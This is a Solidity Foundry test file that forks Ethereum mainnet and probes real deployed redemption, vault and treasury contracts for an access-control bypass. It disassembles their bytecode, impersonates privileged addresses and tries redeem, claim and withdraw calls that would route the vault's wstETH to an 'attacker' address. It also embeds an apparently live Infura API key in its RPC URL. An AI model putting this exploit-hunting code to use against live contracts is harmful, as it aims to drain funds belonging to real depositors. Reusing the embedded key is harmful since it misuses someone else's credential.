// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract AccessControlBypass is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant SAFE_AT_SLOT4 = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant IMPLEMENTATION = 0x434B68B11bBE8FD3074089397cA3d275801d6354;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRCCallAccessControl() public view {
        console.log("=== ANALYZING RC CALL ACCESS CONTROL ===\n");

        bytes memory code = REDEMPTION_1.code;

        // The RC.redeem CALL is at offset 3896
        // Let's analyze the 200 bytes before it for access control patterns

        console.log("Bytecode analysis before RC call at 3896:");

        for (uint i = 3700; i < 3920 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            // Key opcodes for access control
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x14) console.log(i, "EQ");
            if (op == 0x57) console.log(i, "JUMPI (conditional jump)");
            if (op == 0x56) console.log(i, "JUMP");
            if (op == 0x5b) console.log(i, "JUMPDEST");
            if (op == 0xfd) console.log(i, "REVERT");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf1) console.log(i, "CALL");

            // PUSH opcodes with slot numbers or addresses
            if (op == 0x60) { // PUSH1
                console.log(i, "PUSH1:", uint8(code[i+1]));
            }
            if (op == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                console.log(i, "PUSH4:");
                console.logBytes4(sel);
            }
        }
    }

    function test_TryCallAsVariousAddresses() public {
        console.log("=== TRYING CALL AS VARIOUS ADDRESSES ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Addresses that might have access
        address[] memory callers = new address[](10);
        callers[0] = SAFE_AT_SLOT4;  // Treasury Safe
        callers[1] = IMPLEMENTATION;
        callers[2] = TIMELOCK;
        callers[3] = VAULT;
        callers[4] = REDEMPTION_0;
        callers[5] = REDEMPTION_CONTROLLER;
        callers[6] = IAU;
        callers[7] = address(uint160(uint256(vm.load(REDEMPTION_1, bytes32(uint256(0))))));  // Owner from slot 0
        callers[8] = address(uint160(uint256(vm.load(REDEMPTION_1, bytes32(uint256(4))))));  // Slot 4
        callers[9] = address(uint160(uint256(vm.load(REDEMPTION_1, bytes32(uint256(5))))));  // Slot 5 (implementation)

        console.log("Testing callers:");
        for (uint i = 0; i < callers.length; i++) {
            console.log(i, ":", callers[i]);
        }

        // Try calling REDEMPTION_1 as each of these addresses
        for (uint i = 0; i < callers.length; i++) {
            vm.startPrank(callers[i]);

            // Try multiple function patterns
            (bool s1,) = REDEMPTION_1.call(
                abi.encodeWithSelector(bytes4(0x7bde82f2), 100e18, attacker)  // RC.redeem
            );

            (bool s2,) = REDEMPTION_1.call(
                abi.encodeWithSignature("finalize(uint256,address)", 0, attacker)
            );

            (bool s3,) = REDEMPTION_1.call(
                abi.encodeWithSignature("claimFor(address,uint256)", attacker, 100e18)
            );

            vm.stopPrank();

            uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
            if (attackerBal > 0) {
                console.log("*** EXPLOIT FOUND as caller", i, "***");
                break;
            }

            if (s1 || s2 || s3) {
                console.log("Function succeeded for caller", i);
            }
        }

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerBal / 1e18);
    }

    function test_FindWhoCanCallRC() public {
        console.log("=== FINDING WHO CAN CALL RC.REDEEM ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try as REDEMPTION_1 - we know this works!
        console.log("Testing as REDEMPTION_1:");
        vm.startPrank(REDEMPTION_1);
        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 50e18, attacker)
        );
        console.log("RC.redeem success:", s1);
        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker received:", attackerBal / 1e18, "wstETH");

        // Now we need to find how to make REDEMPTION_1 do this call

        // Check what triggers the RC.redeem call in REDEMPTION_1
        console.log("\nLooking for trigger functions...");

        // The call happens at offset 3896
        // We need to find which function selector routes there
    }

    function test_AnalyzeRedemption1FunctionDispatch() public view {
        console.log("=== ANALYZING REDEMPTION_1 FUNCTION DISPATCH ===\n");

        bytes memory code = REDEMPTION_1.code;

        // The first part of the code does selector dispatch
        // Let's map which selectors go to which offsets

        console.log("First 500 bytes - function dispatch:");

        for (uint i = 0; i < 500 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x63) { // PUSH4 - selector
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                console.log("Selector at", i, ":");
                console.logBytes4(sel);
            }

            if (op == 0x61) { // PUSH2 - jump destination
                uint16 dest = uint16(uint8(code[i+1])) << 8 | uint16(uint8(code[i+2]));
                console.log("  Jump dest:", dest);
            }
        }
    }

    function test_TryTreasuryCall() public {
        console.log("=== TRYING AS TREASURY ===\n");

        // Treasury at slot 4 is 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70
        // This is a Gnosis Safe

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // What if REDEMPTION_1 has a function that lets Treasury trigger actions?
        console.log("Trying as Treasury (SAFE_AT_SLOT4):");

        vm.startPrank(SAFE_AT_SLOT4);

        // Try various trigger functions
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(keccak256("claim(address,uint256)"));
        sels[1] = bytes4(keccak256("claimFor(address,uint256)"));
        sels[2] = bytes4(keccak256("withdraw(address,uint256)"));
        sels[3] = bytes4(keccak256("withdrawTo(address,uint256)"));
        sels[4] = bytes4(keccak256("redeemTo(address,uint256)"));
        sels[5] = bytes4(keccak256("execute(uint256,address)"));
        sels[6] = bytes4(keccak256("processRedeem(uint256,address)"));
        sels[7] = bytes4(keccak256("finalizeRedeem(uint256,address)"));
        sels[8] = bytes4(keccak256("sendTo(address,uint256)"));
        sels[9] = bytes4(keccak256("transfer(address,uint256)"));

        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );
            if (s) {
                console.log("SUCCESS with:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        if (attackerBal > 0) {
            console.log("*** TREASURY CAN DRAIN! ***");
            console.log("Attacker received:", attackerBal / 1e18);
        }

        console.log("\nVault change:", int256(IERC20(wstETH).balanceOf(VAULT)) - int256(vaultBefore));
    }

    function test_CheckDelegateCallChain() public {
        console.log("=== CHECKING DELEGATECALL CHAIN ===\n");

        // If we call REDEMPTION_1, it delegates to IMPLEMENTATION
        // In that context, msg.sender is preserved
        // So if IMPLEMENTATION has a function that calls RC.redeem...

        // But RC.redeem checks that msg.sender is a registered redemption contract
        // In delegatecall, msg.sender = original caller, not REDEMPTION_1

        // UNLESS there's a way to trigger REDEMPTION_1's code directly (not via delegatecall)
        // to call RC.redeem

        // Let's check if REDEMPTION_1 itself has any direct code that calls RC

        bytes memory code = REDEMPTION_1.code;

        // The RC.redeem selector at 3861 with CALL at 3896
        // What function reaches this code path?

        // Look for JUMPDEST opcodes before offset 3861
        console.log("JUMPDEST locations before RC.redeem call:");
        uint lastJumpdest = 0;
        for (uint i = 3500; i < 3861 && i < code.length; i++) {
            if (uint8(code[i]) == 0x5b) {
                lastJumpdest = i;
                console.log("JUMPDEST at:", i);
            }
        }
        console.log("Last JUMPDEST before RC call:", lastJumpdest);

        // Now find which selector jumps to this JUMPDEST
        // by looking at the dispatch table
    }

    function test_TraceCallPath() public view {
        console.log("=== TRACING CALL PATH TO RC.REDEEM ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Let's trace backwards from the CALL at 3896
        // to find the entry point

        console.log("Working backwards from CALL at 3896...\n");

        // Find all JUMPDEST between 3500 and 3896
        console.log("JUMPDESTs:");
        for (uint i = 3500; i < 3900; i++) {
            if (uint8(code[i]) == 0x5b) {
                console.log(i);
            }
        }

        // Now look at the function dispatch to see which selectors
        // might route to these JUMPDESTs

        console.log("\nFunction dispatch (first 600 bytes):");

        uint selectorCount = 0;
        for (uint i = 0; i < 600 && i < code.length && selectorCount < 30; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));

                // Look for jump destination after this selector
                for (uint j = i + 5; j < i + 20 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x61) { // PUSH2
                        uint16 dest = uint16(uint8(code[j+1])) << 8 | uint16(uint8(code[j+2]));
                        if (dest > 3500 && dest < 3900) {
                            console.log("Selector:");
                            console.logBytes4(sel);
                            console.log("  -> Jump to:", dest);
                            selectorCount++;
                        }
                        break;
                    }
                }
            }
        }
    }

    function test_DeepSelectorMapping() public view {
        console.log("=== DEEP SELECTOR MAPPING ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Map all PUSH4 (selectors) to their jump destinations

        console.log("Selector to jump destination mapping:");

        for (uint i = 0; i < 800 && i < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));

                // Skip invalid selectors
                if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                if (uint32(sel) < 0x1000) continue;

                // Look for PUSH2 (jump dest) within next 30 bytes
                for (uint j = i + 5; j < i + 30 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x61) { // PUSH2
                        uint16 dest = uint16(uint8(code[j+1])) << 8 | uint16(uint8(code[j+2]));

                        console.logBytes4(sel);
                        console.log("  -> ", dest);

                        // Check if this dest is near the RC.redeem code (3500-3900)
                        if (dest >= 3500 && dest <= 3900) {
                            console.log("  *** ROUTES TO RC.REDEEM AREA! ***");
                        }
                        break;
                    }
                }
            }
        }
    }
}
